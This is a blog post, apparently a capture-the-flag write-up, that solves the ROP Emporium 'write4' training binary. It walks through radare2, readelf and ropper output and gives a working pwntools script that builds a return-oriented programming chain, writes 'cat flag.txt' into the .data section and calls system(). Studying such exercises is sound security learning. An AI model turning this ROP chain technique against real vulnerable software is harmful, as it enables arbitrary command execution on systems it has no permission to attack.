---
layout:     post
title:      'ROP Emporium - write4'
date:       2019-02-04 0:00:00
author:     'W3ndige'
permalink: /:title/
category: 'ROP Emporium'
---

In this post we're going to exploit 4-th challenge from Rop Emporium called `write4`. This time, we don't have any string that will help us viewing the flag, we have to manually place it using different gadgets. Another technique in our sleeve, right?

Firstly, let's check what we're dealing with and if we have any protection set with `NX` bit. 

```text
[w3ndige@main write4]$ rabin2 -I write4 
arch     x86
baddr    0x400000
binsz    7150
bintype  elf
bits     64
canary   false
sanitiz  false
class    ELF64
crypto   false
endian   little
havecode true
intrp    /lib64/ld-linux-x86-64.so.2
laddr    0x0
lang     c
linenum  true
lsyms    true
machine  AMD x86-64 architecture
maxopsz  16
minopsz  1
nx       true
os       linux
pcalign  0
pic      false
relocs   true
relro    partial
rpath    NONE
static   false
stripped false
subsys   linux
va       true

[w3ndige@main write4]$ radare2 -AAA write4 
[x] Analyze all flags starting with sym. and entry0 (aa)
[x] Analyze function calls (aac)
[x] Analyze len bytes of instructions for references (aar)
[x] Constructing a function name for fcn.* and sym.func.* functions (aan)
[x] Enable constraint types analysis for variables
 -- This incident will be reported
[0x00400650]> i~nx
nx       true

```

We know that `NX` bit is set. Actually, after looking at disassembled code, not much changed from the `split` challenge, apart from the fact that the string that we used in that particular challenge is no more present in this binary. We can confirm that with `strings` and `grep`. 

```text
[w3ndige@main write4]$ strings write4 | grep 'cat flag.txt'
```

Now let's take a quick look at disassembled code. I won't discuss it much further as it's mostly the same as `split` challenge. This time, we'll have to focus more on the exploit. 

```text
[0x00400650]> afl
0x004005a0    3 26           sym._init
0x004005d0    1 6            sym.imp.puts
0x004005e0    1 6            sym.imp.system
0x004005f0    1 6            sym.imp.printf
0x00400600    1 6            sym.imp.memset
0x00400610    1 6            sym.imp.__libc_start_main
0x00400620    1 6            sym.imp.fgets
0x00400630    1 6            sym.imp.setvbuf
0x00400640    1 6            sub.__gmon_start_400640
0x00400650    1 41           entry0
0x00400680    4 50   -> 41   sym.deregister_tm_clones
0x004006c0    4 58   -> 55   sym.register_tm_clones
0x00400700    3 28           sym.__do_global_dtors_aux
0x00400720    4 38   -> 35   entry.init0
0x00400746    1 111          sym.main
0x004007b5    1 82           sym.pwnme
0x00400807    1 17           sym.usefulFunction
0x00400830    4 101          sym.__libc_csu_init
0x004008a0    1 2            sym.__libc_csu_fini
0x004008a4    1 9            sym._fini
[0x00400650]> pdf @sym.usefulFunction
/ (fcn) sym.usefulFunction 17
|   sym.usefulFunction ();
|           0x00400807      55             push rbp
|           0x00400808      4889e5         mov rbp, rsp
|           0x0040080b      bf0c094000     mov edi, str.bin_ls         ; 0x40090c ; "/bin/ls"
|           0x00400810      e8cbfdffff     call sym.imp.system         ; int system(const char *string)
|           0x00400815      90             nop
|           0x00400816      5d             pop rbp
\           0x00400817      c3             ret
```

In `usefulFunction`, we have call to `system()` but with `/bin/ls` arguments. As we cannot use anything present in the binary, we have to place `cat flag.txt` string manually into the system. First question is, where?

```text
[w3ndige@main write4]$ readelf -a write4 
ELF Header:
  Magic:   7f 45 4c 46 02 01 01 00 00 00 00 00 00 00 00 00 
  Class:                             ELF64
  Data:                              2's complement, little endian
  Version:                           1 (current)
  OS/ABI:                            UNIX - System V
  ABI Version:                       0
  Type:                              EXEC (Executable file)
  Machine:                           Advanced Micro Devices X86-64
  Version:                           0x1
  Entry point address:               0x400650
  Start of program headers:          64 (bytes into file)
  Start of section headers:          7152 (bytes into file)
  Flags:                             0x0
  Size of this header:               64 (bytes)
  Size of program headers:           56 (bytes)
  Number of program headers:         9
  Size of section headers:           64 (bytes)
  Number of section headers:         31
  Section header string table index: 28

Section Headers:
  [Nr] Name              Type             Address           Offset
       Size              EntSize          Flags  Link  Info  Align
  [ 0]                   NULL             0000000000000000  00000000
       0000000000000000  0000000000000000           0     0     0
  [ 1] .interp           PROGBITS         0000000000400238  00000238
       000000000000001c  0000000000000000   A       0     0     1
  [ 2] .note.ABI-tag     NOTE             0000000000400254  00000254
       0000000000000020  0000000000000000   A       0     0     4
  [ 3] .note.gnu.build-i NOTE             0000000000400274  00000274
       0000000000000024  0000000000000000   A       0     0     4
  [ 4] .gnu.hash         GNU_HASH         0000000000400298  00000298
       0000000000000030  0000000000000000   A       5     0     8
  [ 5] .dynsym           DYNSYM           00000000004002c8  000002c8
       0000000000000120  0000000000000018   A       6     1     8
  [ 6] .dynstr           STRTAB           00000000004003e8  000003e8
       0000000000000074  0000000000000000   A       0     0     1
  [ 7] .gnu.version      VERSYM           000000000040045c  0000045c
       0000000000000018  0000000000000002   A       5     0     2
  [ 8] .gnu.version_r    VERNEED          0000000000400478  00000478
       0000000000000020  0000000000000000   A       6     1     8
  [ 9] .rela.dyn         RELA             0000000000400498  00000498
       0000000000000060  0000000000000018   A       5     0     8
  [10] .rela.plt         RELA             00000000004004f8  000004f8
       00000000000000a8  0000000000000018  AI       5    24     8
  [11] .init             PROGBITS         00000000004005a0  000005a0
       000000000000001a  0000000000000000  AX       0     0     4
  [12] .plt              PROGBITS         00000000004005c0  000005c0
       0000000000000080  0000000000000010  AX       0     0     16
  [13] .plt.got          PROGBITS         0000000000400640  00000640
       0000000000000008  0000000000000000  AX       0     0     8
  [14] .text             PROGBITS         0000000000400650  00000650
       0000000000000252  0000000000000000  AX       0     0     16
  [15] .fini             PROGBITS         00000000004008a4  000008a4
       0000000000000009  0000000000000000  AX       0     0     4
  [16] .rodata           PROGBITS         00000000004008b0  000008b0
       0000000000000064  0000000000000000   A       0     0     8
  [17] .eh_frame_hdr     PROGBITS         0000000000400914  00000914
       0000000000000044  0000000000000000   A       0     0     4
  [18] .eh_frame         PROGBITS         0000000000400958  00000958
       0000000000000134  0000000000000000   A       0     0     8
  [19] .init_array       INIT_ARRAY       0000000000600e10  00000e10
       0000000000000008  0000000000000000  WA       0     0     8
  [20] .fini_array       FINI_ARRAY       0000000000600e18  00000e18
       0000000000000008  0000000000000000  WA       0     0     8
  [21] .jcr              PROGBITS         0000000000600e20  00000e20
       0000000000000008  0000000000000000  WA       0     0     8
  [22] .dynamic          DYNAMIC          0000000000600e28  00000e28
       00000000000001d0  0000000000000010  WA       6     0     8
  [23] .got              PROGBITS         0000000000600ff8  00000ff8
       0000000000000008  0000000000000008  WA       0     0     8
  [24] .got.plt          PROGBITS         0000000000601000  00001000
       0000000000000050  0000000000000008  WA       0     0     8
  [25] .data             PROGBITS         0000000000601050  00001050
       0000000000000010  0000000000000000  WA       0     0     8
  [26] .bss              NOBITS           0000000000601060  00001060
       0000000000000030  0000000000000000  WA       0     0     32
  [27] .comment          PROGBITS         0000000000000000  00001060
       0000000000000034  0000000000000001  MS       0     0     1
  [28] .shstrtab         STRTAB           0000000000000000  00001ae2
       000000000000010c  0000000000000000           0     0     1
  [29] .symtab           SYMTAB           0000000000000000  00001098
       0000000000000768  0000000000000018          30    50     8
  [30] .strtab           STRTAB           0000000000000000  00001800
       00000000000002e2  0000000000000000           0     0     1
Key to Flags:
  W (write), A (alloc), X (execute), M (merge), S (strings), I (info),
  L (link order), O (extra OS processing required), G (group), T (TLS),
  C (compressed), x (unknown), o (OS specific), E (exclude),
  l (large), p (processor specific)
```

Tool called `readelf` will show us all essential information about the binary in order to find a good place for our string. Look at `Section headers`. There we have a list of sections present in a binary, but we cannot choose just any. We have to find a section, that will allow us to write there a value. In addition, placing there our string and possibly corrupting the data should not damage anything important. 

Do you have a target? Personally, I would go for `.data` section at address `0000000000601050`. In addition, we can check if there is any data present in this section.

```text
[w3ndige@main write4]$ readelf -x .data write4 

Hex dump of section '.data':
  0x00601050 00000000 00000000 00000000 00000000 ................
```

Nothing! That should work great. 

Now we have to find gadgets that will allow us to place that string into the section. I'm going to use `ropper` once again. 

```text
[w3ndige@main write4]$ ropper --file write4
[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%



Gadgets
=======


0x00000000004006a2: adc byte ptr [rax], ah; jmp rax; 
0x000000000040089f: add bl, dh; ret; 
0x0000000000400734: add byte ptr [rax - 0x7b], cl; sal byte ptr [rcx + rsi*8 + 0x55], 0x48; mov ebp, esp; call rax; 
0x000000000040089d: add byte ptr [rax], al; add bl, dh; ret; 
0x0000000000400732: add byte ptr [rax], al; add byte ptr [rax - 0x7b], cl; sal byte ptr [rcx + rsi*8 + 0x55], 0x48; mov ebp, esp; call rax; 
0x000000000040089b: add byte ptr [rax], al; add byte ptr [rax], al; add bl, dh; ret; 
0x000000000040081c: add byte ptr [rax], al; add byte ptr [rax], al; mov qword ptr [r14], r15; ret; 
0x00000000004006ac: add byte ptr [rax], al; add byte ptr [rax], al; pop rbp; ret; 
0x00000000004007a1: add byte ptr [rax], al; add byte ptr [rdi + 0x4008d7], bh; call 0x5d0; mov eax, 0; pop rbp; ret; 
0x00000000004005b3: add byte ptr [rax], al; add rsp, 8; ret; 
0x00000000004007a2: add byte ptr [rax], al; mov edi, 0x4008d7; call 0x5d0; mov eax, 0; pop rbp; ret; 
0x000000000040081e: add byte ptr [rax], al; mov qword ptr [r14], r15; ret; 
0x00000000004007fa: add byte ptr [rax], al; mov rdi, rax; call 0x620; nop; leave; ret; 
0x00000000004006ae: add byte ptr [rax], al; pop rbp; ret; 
0x00000000004008a2: add byte ptr [rax], al; sub rsp, 8; add rsp, 8; ret; 
0x00000000004007a3: add byte ptr [rdi + 0x4008d7], bh; call 0x5d0; mov eax, 0; pop rbp; ret; 
0x0000000000400714: add eax, 0x20096e; add ebx, esi; ret; 
0x0000000000400719: add ebx, esi; ret; 
0x00000000004005b6: add esp, 8; ret; 
0x00000000004005b5: add rsp, 8; ret; 
0x0000000000400717: and byte ptr [rax], al; add ebx, esi; ret; 
0x00000000004007a9: call 0x5d0; mov eax, 0; pop rbp; ret; 
0x0000000000400810: call 0x5e0; nop; pop rbp; ret; 
0x00000000004007ff: call 0x620; nop; leave; ret; 
0x00000000004005b0: call 0x640; add rsp, 8; ret; 
0x0000000000400745: call qword ptr [rbp + 0x48]; 
0x0000000000400a13: call qword ptr [rcx]; 
0x00000000004009f3: call qword ptr [rdx]; 
0x000000000040073e: call rax; 
0x000000000040093b: call rsp; 
0x000000000040087c: fmul qword ptr [rax - 0x7d]; ret; 
0x0000000000400a33: jmp qword ptr [rbp]; 
0x00000000004006a5: jmp rax; 
0x0000000000400711: lcall ptr [rbp - 0x3a]; add eax, 0x20096e; add ebx, esi; ret; 
0x0000000000400821: mov dword ptr [rsi], edi; ret; 
0x00000000004007ae: mov eax, 0; pop rbp; ret; 
0x00000000004005b1: mov eax, dword ptr [rax]; add byte ptr [rax], al; add rsp, 8; ret; 
0x000000000040073c: mov ebp, esp; call rax; 
0x0000000000400809: mov ebp, esp; mov edi, 0x40090c; call 0x5e0; nop; pop rbp; ret; 
0x00000000004007a4: mov edi, 0x4008d7; call 0x5d0; mov eax, 0; pop rbp; ret; 
0x000000000040080b: mov edi, 0x40090c; call 0x5e0; nop; pop rbp; ret; 
0x00000000004006a0: mov edi, 0x601060; jmp rax; 
0x00000000004007fd: mov edi, eax; call 0x620; nop; leave; ret; 
0x0000000000400820: mov qword ptr [r14], r15; ret; 
0x000000000040073b: mov rbp, rsp; call rax; 
0x0000000000400808: mov rbp, rsp; mov edi, 0x40090c; call 0x5e0; nop; pop rbp; ret; 
0x00000000004007fc: mov rdi, rax; call 0x620; nop; leave; ret; 
0x0000000000400818: nop dword ptr [rax + rax]; mov qword ptr [r14], r15; ret; 
0x00000000004006a8: nop dword ptr [rax + rax]; pop rbp; ret; 
0x00000000004006f5: nop dword ptr [rax]; pop rbp; ret; 
0x00000000004006a7: nop word ptr [rax + rax]; pop rbp; ret; 
0x00000000004007a6: or byte ptr [rax], al; call 0x5d0; mov eax, 0; pop rbp; ret; 
0x000000000040080d: or dword ptr [rax], eax; call 0x5e0; nop; pop rbp; ret; 
0x000000000040088c: pop r12; pop r13; pop r14; pop r15; ret; 
0x000000000040088e: pop r13; pop r14; pop r15; ret; 
0x0000000000400890: pop r14; pop r15; ret; 
0x0000000000400892: pop r15; ret; 
0x000000000040069f: pop rbp; mov edi, 0x601060; jmp rax; 
0x000000000040088b: pop rbp; pop r12; pop r13; pop r14; pop r15; ret; 
0x000000000040088f: pop rbp; pop r14; pop r15; ret; 
0x00000000004006b0: pop rbp; ret; 
0x0000000000400893: pop rdi; ret; 
0x0000000000400891: pop rsi; pop r15; ret; 
0x000000000040088d: pop rsp; pop r13; pop r14; pop r15; ret; 
0x000000000040073a: push rbp; mov rbp, rsp; call rax; 
0x0000000000400737: sal byte ptr [rcx + rsi*8 + 0x55], 0x48; mov ebp, esp; call rax; 
0x00000000004008a5: sub esp, 8; add rsp, 8; ret; 
0x00000000004008a4: sub rsp, 8; add rsp, 8; ret; 
0x000000000040081a: test byte ptr [rax], al; add byte ptr [rax], al; add byte ptr [rax], al; mov qword ptr [r14], r15; ret; 
0x00000000004006aa: test byte ptr [rax], al; add byte ptr [rax], al; add byte ptr [rax], al; pop rbp; ret; 
0x0000000000400739: int1; push rbp; mov rbp, rsp; call rax; 
0x0000000000400805: leave; ret; 
0x0000000000400815: nop; pop rbp; ret; 
0x0000000000400804: nop; leave; ret; 
0x00000000004005b9: ret; 
0x00000000004007a5: xlatb; or byte ptr [rax], al; call 0x5d0; mov eax, 0; pop rbp; ret; 
```

But what exactly are we looking for? Firstly, we have to find a gadget that will place value at memory address. In assembly this operation looks like this `MOV [R0], R1`, which directly translates to move value from register `R1` to memory at address held by register `R0`. 

The best candidate would gadget at address `0x0000000000400820` which is `mov qword ptr [r14], r15; ret;` So we can now place a value into memory, but we also need to place values into these registers with `pop`, which we can do with this gadget `pop r14; pop r15; ret;` at addtess `0x0000000000400890`. Now to finally finish collecting addresses, we have to come back and get the address of `system()` and in order to place the address of the string as the argument to this call, `pop rdi` will be needed. This gadget can be found at address `0x0000000000400893`.

Great, now we can start writing our exploit. 

* Use `pop` gadget to place the address of our string, and string in registers
* Use `mov` gadget to place the string into the memory at provided address
* Use `pop rdi` gadget to place the address of the string into register.
* Call address of `system()` which uses `rdi` as the argument register holding address of our string. 

Doesn't seem hard after all, right?

```python
from pwn import *

def place_string_at_address(mov_gadget_address, pop_gadget_address, string_address, string):

     # We have to remember that the length of the string has to be
     # divisibe by eight to make the padding in payload correct.
     while len(string) % 8 != 0:
          string += "\x00"

     splitted_string = [string[i:i + 8] for i in range(0, len(string), 8)]
     payload = ""
     for i in range(len(splitted_string)):
        
          # Place the gadgets into the payload.
          payload += p64(pop_gadget_address)
          payload += p64(string_address + (i * 8)) # We have to increment address in order
                                                   # to not overwrite previous strings.

          payload += splitted_string[i]
          payload += p64(mov_gadget_address)

     return payload

# 40 bytes of random data.
offset = 'A' * 40

offset += place_string_at_address(0x400820, 0x400890, 0x601050, "cat flag.txt")

offset += p64(0x0000000000400893) # Address of pop rdi
offset += p64(0x0000000000601050) # Address of string
offset += p64(0x00400810)         # Address of system()

print(offset)
```

And here's the result.

```bash
[w3ndige@main write4]$ python2 exploit.py | ./write4 
write4 by ROP Emporium
64bits

Go ahead and give me the string already!
> ROPE{a_placeholder_32byte_flag!}
Segmentation fault (core dumped)
```